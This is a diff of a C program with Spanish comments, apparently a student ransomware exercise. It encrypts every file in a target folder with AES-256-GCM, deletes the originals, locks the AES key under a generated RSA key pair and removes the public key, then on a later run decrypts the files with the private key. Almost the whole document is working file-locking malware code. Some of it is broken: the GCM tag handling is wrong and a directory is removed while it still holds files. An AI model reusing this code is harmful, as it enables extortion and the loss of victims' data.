@@ -2,6 +2,9 @@
 #include <string.h>
 #include <windows.h>
 #include <tchar.h>
+#include <Shlwapi.h>
+#include <dirent.h>
+#include <direct.h>
 #include <openssl/evp.h>
 #include <openssl/rand.h>
 #include <openssl/rsa.h>
@@ -125,212 +128,214 @@ void saveIVToFile(const char *ivFileName, const unsigned char *iv, int ivLength)
     }
 }
 
-void encryptFile(const char *inputFile, const char *outputFile, const unsigned char *key, const unsigned char *iv) {
-    FILE *input = fopen(inputFile, "rb");
-    FILE *output = fopen(outputFile, "wb");
 
-    if (input && output) {
-        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
-        EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
+int main()
+{
 
-        unsigned char buffer[1024];
-        int bytesRead, encryptedLength;
-
-        while ((bytesRead = fread(buffer, 1, sizeof(buffer), input)) > 0) {
-            EVP_EncryptUpdate(ctx, buffer, &encryptedLength, buffer, bytesRead);
-            fwrite(buffer, 1, encryptedLength, output);
-        }
-
-        EVP_EncryptFinal_ex(ctx, buffer, &encryptedLength);
-        fwrite(buffer, 1, encryptedLength, output);
-
-        EVP_CIPHER_CTX_free(ctx);
-
-        fclose(input);
-        fclose(output);
-
-        printf("Encriptación exitosa. Se han encriptado %d bytes.\n", encryptedLength);
-    } else {
-        printf("Error: No se pudieron abrir los archivos de entrada o salida.\n");
-    }
-}
-
-void decryptFile(const char *inputFile, const char *outputFile, const unsigned char *key, const unsigned char *iv) {
-    FILE *input = fopen(inputFile, "rb");
-    FILE *output = fopen(outputFile, "wb");
-
-    if (input && output) {
-        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
-        EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
-
-        unsigned char inBuffer[1024];
-        unsigned char outBuffer[1024];
-        int bytesRead, decryptedLength = 1;
-
-        while ((bytesRead = fread(inBuffer, 1, sizeof(inBuffer), input)) > 0) {
-            EVP_DecryptUpdate(ctx, outBuffer, &decryptedLength, inBuffer, bytesRead);
-            fwrite(outBuffer, 1, decryptedLength, output);
-        }
-
-        EVP_DecryptFinal_ex(ctx, outBuffer, &decryptedLength);
-        fwrite(outBuffer, 1, decryptedLength, output);
-
-        EVP_CIPHER_CTX_free(ctx);
-
-        fclose(input);
-        fclose(output);
-
-        printf("Desencriptación exitosa. Se han desencriptado %d bytes.\n", decryptedLength);
-    } else {
-        printf("Error: No se pudieron abrir los archivos de entrada o salida.\n");
-    }
-}
-
-int main() {
-    // Inicializar OpenSSL
+    // Inicializamos OpenSSL//
     OpenSSL_add_all_algorithms();
-
-    // Definir la ruta completa de la carpeta a encriptar
-    const char *LeerRegular = "C:\\Users\\usuario\\Desktop\\Objetivo\\*.*"; // Ruta a la carpeta donde se leeran archivos a encritar
-
-    // Definir la ruta completa de la carpeta de salida para archivos encriptados
-    const char *LeerEncriptados = "C:\\Users\\usuario\\Desktop\\Encriptados\\*.*"; // Ruta a la carpeta donde se leeran archivos encriptaos
-
-    const char *CarpetaRegular = "C:\\Users\\usuario\\Desktop\\Objetivo\\";
-
-    const char *CarpetaEncriptado = "C:\\Users\\usuario\\Desktop\\Encriptados\\";
-
-    // Definir la ruta completa al archivo de clave
-    const char *keyFileName = "C:\\Users\\usuario\\Desktop\\Clave.txt";
-
-    // Definir la ruta completa al archivo del IV
-    const char *ivFileName = "C:\\Users\\usuario\\Desktop\\IV.txt";
-
-    const char *privateKeyFileName = "C:\\Users\\usuario\\Desktop\\privado.pem"; 
-    const char *publicKeyFileName = "C:\\Users\\usuario\\Desktop\\publico.pem";
-    const char *clavecifrada = "C:\\Users\\usuario\\Desktop\\AEScifrado.txt";
-    const char *ivAEScifrada = "C:\\Users\\usuario\\Desktop\\IVcifrado.txt";
 
     // Definir la clave y el vector de inicialización (IV)
     unsigned char key[32];
     unsigned char iv[16];
+    // Definir la ruta completa al archivo de la clave
+    const char *keyFileName = "C:\\Users\\usuario\\Desktop\\Clave.txt"; 
+    const char *EnckeyFileName = "C:\\Users\\usuario\\Desktop\\Clave.txt.enc"; 
 
-    // Verificar si el archivo de clave existe
-    FILE *cifrado = fopen(clavecifrada, "rb");
-    if (cifrado) {
-        fclose(cifrado);
-        FILE *privateKeyFile = fopen(privateKeyFileName, "rb");
+    // Definir la ruta completa al archivo del IV
+    const char *ivFileName = "C:\\Users\\usuario\\Desktop\\IV.txt"; 
+
+    // Definimos la carpeta a encriptar//
+    const char *Target = "C:\\Users\\usuario\\Desktop\\Objetivo";
+    DIR *Victim = opendir(Target);
+
+    const char *Encriptado = "C:\\Users\\usuario\\Desktop\\Encriptados";
+    const char *Clave = "C:\\Users\\usuario\\Desktop";
+    
+    struct dirent *File;
+
+    // claves RSA //
+    const char *PrivateKey = "C:\\Users\\usuario\\Desktop\\ClavePrivada.pem";
+    const char *PublicKey = "C:\\Users\\usuario\\Desktop\\ClavePublica.pem";
+
+    if ((File = readdir(Victim)) != NULL){
+    int Envirao = mkdir(Encriptado);
+    int Secreto = mkdir(Clave);
+    generateRandomKey(key, sizeof(key));
+    generateRandomIV(iv, sizeof(iv));
+    generateRSAKeyPair(PrivateKey,PublicKey);
+
+    // Lectura de los archivos del fichero //
+    while ((File = readdir(Victim)) != NULL)
+    {   
+        
+        if (strcmp(File->d_name, ".") != 0 && strcmp(File->d_name, "..") != 0) {
+            printf("Nombre del archivo: %s\n", File->d_name);
+
+          LPCSTR extension = PathFindExtensionA(File->d_name);
+
+            // Comprobamos si está encriptado o no el archivo //
+            // ENCRIPTAMOS //
+            if(_stricmp(extension, ".enc") != 0){
+                char inputFileName[1024];
+                PathCombineA(inputFileName, Target, File->d_name);
+                printf("Ruta del archivo: %s\n", inputFileName);
+                FILE *inputFile = fopen(inputFileName, "rb");
+                const char *enc = ".enc";
+                char outputFileName[1024]; // Declarar un búfer para el nombre de archivo de salida
+                strcpy(outputFileName, File->d_name); // Copiar el nombre del archivo original
+                strcat(PathCombineA(outputFileName, Encriptado, File->d_name), enc); // Concatenar la extensión ".enc"
+
+                FILE *outputFile = fopen(outputFileName, "wb"); // Abrir el archivo de salida
+
+                // Comprobamos la correcta apertura de los ficheros //
+                if(inputFile && outputFile){
+                    printf("se abren bien los archivos");
+                    // Creamos el contexto
+                    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+                    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
+                    EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv);
+                    unsigned char inBuf[1024];
+                    unsigned char outBuf[1040];
+                    int bytesRead, bytesWritten;
+
+                    // Comenzamos a encriptar el archivo //
+                    while ((bytesRead = fread(inBuf, 1, sizeof(inBuf), inputFile)) > 0) {
+
+                        EVP_EncryptUpdate(ctx, outBuf, &bytesWritten, inBuf, bytesRead);
+                        fwrite(outBuf, 1, bytesWritten, outputFile);
+                        
+                    }
+                    EVP_EncryptFinal_ex(ctx, outBuf, &bytesWritten);
+                    fwrite(outBuf, 1, bytesWritten, outputFile);
+
+                    // Obtiene la etiqueta de autenticación
+                    unsigned char tag[16];
+                    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, sizeof(tag), tag);
+
+                    // Escribe la etiqueta de autenticación en el archivo de salida
+                    fwrite(tag, 1, sizeof(tag), outputFile);
+                    
+                    if (inputFile != NULL) {
+                        fclose(inputFile);
+                    }
+
+                    if (outputFile != NULL) {
+                        fclose(outputFile);
+                    }
+
+                    saveIVToFile(ivFileName,iv,sizeof(iv));
+                    saveKeyToFile(keyFileName,key,sizeof(key));
+
+                    FILE* publicKeyFile = fopen(PublicKey, "rb");
+                    RSA* clavePublica = PEM_read_RSAPublicKey(publicKeyFile, NULL, NULL, NULL);
+                    fclose(publicKeyFile);
+                    encryptWithPublicKey(keyFileName,EnckeyFileName,clavePublica);
+                    RSA_free(clavePublica);
+                    
+
+                    remove(inputFileName);
+                    rmdir(Target);
+
+                }else {
+                    printf("Error al abrir uno o ambos archivos.\n");
+                }
+            }
+        } 
+    }
+    remove(PublicKey);
+    }else {
+        FILE *privateKeyFile = fopen(PrivateKey, "rb");
         RSA *clavePrivada = PEM_read_RSAPrivateKey(privateKeyFile, NULL, NULL, NULL);
         fclose(privateKeyFile);
-
-        decryptWithPrivateKey(clavecifrada, keyFileName, clavePrivada);
-        decryptWithPrivateKey(ivAEScifrada, ivFileName, clavePrivada);
-
+        decryptWithPrivateKey(EnckeyFileName,keyFileName,clavePrivada);
         RSA_free(clavePrivada);
-
-        FILE *keyFile = fopen(keyFileName, "rb");
-        fread(key, 1, sizeof(key), keyFile);
-        fclose(keyFile);
         
-        // Leer el IV desde el archivo
-        FILE *ivFile = fopen(ivFileName, "rb");
-        if (ivFile) {
-            fread(iv, 1, sizeof(iv), ivFile);
-            fclose(ivFile);
-        } else {
-            printf("Error: no se encontró el archivo IV.\n");
-            return 1;
-        }
 
-        // Realizar operaciones de descifrado sobre los archivos de la carpeta "encriptado"
-        WIN32_FIND_DATA findFileData;
-     
-        HANDLE hFind = FindFirstFile((LeerEncriptados), &findFileData);
+        int Objetivo = mkdir(Target);
+        DIR *Envirao =opendir(Encriptado);
+        while ((File = readdir(Envirao)) != NULL){
+            
+            if (strcmp(File->d_name, ".") != 0 && strcmp(File->d_name, "..") != 0) {
+                LPCSTR extension = PathFindExtensionA(File->d_name);
 
-        if (hFind != INVALID_HANDLE_VALUE) {
-            do {
-                if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-                    char inputFile[MAX_PATH];
-                    char outputFile[MAX_PATH];
+            // Comprobamos si está encriptado o no el archivo //
+            // Desencriptamos //
+            if(_stricmp(extension, ".enc") == 0){
+                printf("La extensión es .enc \n");
+                // Lee la clave y la extrae//
+                FILE *keyFile = fopen(keyFileName, "rb");
+                fread(key, 1, sizeof(key), keyFile);
+                fclose(keyFile);
 
-                    _sntprintf(inputFile, MAX_PATH, _T("%s\\%s"), CarpetaEncriptado, findFileData.cFileName);
-                    _sntprintf(outputFile, MAX_PATH, _T("%s\\%s"), CarpetaRegular, findFileData.cFileName);
+                // Comprueba que IV existe, lo lee y lo extrae//
+                FILE *ivFile = fopen(ivFileName, "rb");
+                if (ivFile) {
+                fread(iv, 1, sizeof(iv), ivFile);
+                fclose(ivFile);
+        
+                char inputFileName[1024];
+                PathCombineA(inputFileName, Encriptado, File->d_name);
+                FILE *inputFile = fopen(inputFileName, "rb");
+                const char *enc = ".enc";
+                char outputFileName[1024]; // Declarar un búfer para el nombre de archivo de salida
+                strcpy(outputFileName, File->d_name); // Copiar el nombre del archivo original
+                char *encPtr = strstr(PathCombineA(outputFileName,Target,File->d_name), enc);
 
-                    if (_taccess(outputFile, 0) != 0) {
-                        // El archivo de salida no existe, así que lo creamos
-                        FILE *newFile = _tfopen(outputFile, _T("wb"));
-                        if (!newFile) {
-                            printf("Error al crear el archivo de salida: %s\n", outputFile);
-                        }
-
-                        fclose(newFile);
-                    }
-                    decryptFile(inputFile, outputFile, key, iv);
-                    remove(inputFile);
+                // Si se encuentra la cadena ".enc", eliminarla
+                if (encPtr != NULL) {
+                    *encPtr = '\0'; // Establecer el carácter nulo en el lugar de ".enc"
                 }
-            } while (FindNextFile(hFind, &findFileData) != 0);
+                FILE *outputFile = fopen(outputFileName, "wb"); // Abrir el archivo de salida
+                if(inputFile && outputFile){
+                    printf("input y output fino \n");
+                    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+                    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
+                    EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv);
+                    unsigned char inBuf[1024];
+                    unsigned char outBuf[1040];
+                    int bytesRead, bytesWritten;
 
-            remove(keyFileName);
-            remove(ivFileName);
-            remove(privateKeyFileName);
-            FindClose(hFind);
-            printf("Archivos desencriptados con éxito.\n");
-        } else {
-            printf("Error al abrir la carpeta de archivos encriptados.\n");
-        }
-    } else {
-        // Si el archivo de clave no existe, generamos una nueva clave y la guardamos
-        generateRandomKey(key, sizeof(key));
-        saveKeyToFile(keyFileName, key, sizeof(key));
+                    // Comenzamos a desencriptar el archivo //
+                    while ((bytesRead = fread(inBuf, 1, sizeof(inBuf), inputFile)) > 0) {
 
-        // Generar un IV aleatorio
-        generateRandomIV(iv, sizeof(iv));
-        saveIVToFile(ivFileName, iv, sizeof(iv));
-
-        generateRSAKeyPair(privateKeyFileName, publicKeyFileName);
-
-        FILE* publicKeyFile = fopen(publicKeyFileName, "rb");
-        RSA* clavePublica = PEM_read_RSAPublicKey(publicKeyFile, NULL, NULL, NULL);
-        fclose(publicKeyFile);
-
-        encryptWithPublicKey(keyFileName, clavecifrada, clavePublica);
-        encryptWithPublicKey(ivFileName, ivAEScifrada, clavePublica);
-
-        RSA_free(clavePublica);
-
-        // Realizar operaciones de cifrado sobre los archivos de la carpeta "patata"
-        WIN32_FIND_DATA findFileData;
-        HANDLE hFind = FindFirstFile((LeerRegular), &findFileData);
-
-        if (hFind != INVALID_HANDLE_VALUE) {
-            do {
-                if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-                    char inputFile[MAX_PATH];
-                    char outputFile[MAX_PATH];
-
-                    _sntprintf(inputFile, MAX_PATH, _T("%s\\%s"), CarpetaRegular, findFileData.cFileName);
-                    _sntprintf(outputFile, MAX_PATH, _T("%s\\%s"), CarpetaEncriptado, findFileData.cFileName);
-
-                    if (_taccess(outputFile, 0) != 0) {
-                        // El archivo de salida no existe, así que lo creamos
-                        FILE *newFile = _tfopen(outputFile, _T("wb"));
-                        if (!newFile) {
-                            printf("Error al crear el archivo de salida: %s\n", outputFile);
-                        }
-                        fclose(newFile);
+                        EVP_DecryptUpdate(ctx, outBuf, &bytesWritten, inBuf, bytesRead);
+                        fwrite(outBuf, 1, bytesWritten, outputFile);
+                        
                     }
-                    encryptFile(inputFile, outputFile, key, iv);
-                    remove(inputFile);
-                }
-            } while (FindNextFile(hFind, &findFileData) != 0);
+                    EVP_DecryptFinal_ex(ctx, outBuf, &bytesWritten);
+                    fwrite(outBuf, 1, bytesWritten, outputFile);
 
-            FindClose(hFind);
-            printf("Archivos encriptados con éxito y la clave se ha guardado en '%s'.\n", keyFileName);
-            remove(publicKeyFileName);
-        } else {
-            printf("Error al abrir la carpeta de archivos a encriptar.\n");
+                    // Obtener la etiqueta de autenticación del archivo encriptado
+                    unsigned char tag[16];
+                    fread(tag, 1, sizeof(tag), inputFile);
+
+                    // Establecer la etiqueta de autenticación en el contexto de desencriptado
+                    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, sizeof(tag), tag);
+
+                    // Verificar la autenticación
+                    int result = EVP_DecryptFinal_ex(ctx, outBuf, &bytesWritten);
+                    EVP_CIPHER_CTX_free(ctx);
+                    if (inputFile != NULL) {
+                        fclose(inputFile);
+                    }
+
+                    if (outputFile != NULL) {
+                        fclose(outputFile);
+                    }
+                    remove(inputFileName);
+                    
+            }
         }
+
     }
-
+            }
+        }
+        rmdir(Encriptado);
+        remove(keyFileName);
+        remove(ivFileName);
+        remove(PrivateKey);
+    }
     return 0;
+
 }
